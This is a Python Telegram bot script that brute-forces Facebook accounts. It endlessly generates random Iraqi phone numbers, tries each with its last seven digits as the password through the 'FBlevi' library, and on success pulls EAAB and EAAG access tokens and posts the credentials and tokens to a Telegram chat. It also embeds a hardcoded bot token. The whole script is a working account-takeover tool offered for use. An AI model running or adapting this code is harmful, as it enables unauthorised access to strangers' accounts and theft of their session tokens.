import os
os.system('pip install FBlevi')
os.system('pip install pyotp')
os.system('pip install mechanize')
try:
	from time import sleep
	import telebot
	import requests,string
	import requests
	import FBlevi
	from FBlevi import *
	import random
except Exception as e:print(e)
#------------------------------
tokeen = '2082083949:AAFNFqt9RJvSAH83pTg3gMzypQmyQEszb68'
bot = telebot.TeleBot(tokeen)
@bot.message_handler(commands=['start'])
def Welcome(message):
	bot.reply_to(message,'''
⌯ تم تطوير هذا البوت من قبل المطور TAKEMICHI
⌯ @Q_2_M''',reply_markup=telebot.types.InlineKeyboardMarkup([
        [telebot.types.InlineKeyboardButton(text='بدأ الفحص', callback_data='start')]
    ]))    
@bot.callback_query_handler(lambda call: call.data == "start")  
def TamTa(call):
    good = 0
    vm=0
    while True:
        vm+=1
        phn = ['78', '77', '75']
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        codo = ''.join(random.choice(phn)for i in range(1))
        user = '+964'+codo+nmp
        ps= nmp
        FB = Start(phone=user, password=ps)
        if FB.IsValid:
            good += 1
            TokenEAAG = FB.TokenEAAG()
            TokenEAAB = FB.TokenEAAB()
            bot.send_message(call.message.chat.id,f'''
--------HIT-------
EMAIL : {user}
PAS : {ps}
TOKEN A : {TokenEAAB}
TOKEN G : {TokenEAAG}
@Q_2_M''')
        else:
        	sleep(2)
        	bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=f'''
⌯CHEKER  [ {vm} | {user} | {ps} ]
⌯GOOD :  [{good}]
⌯ py :  @Q_2_M''')
bot.polling(True)
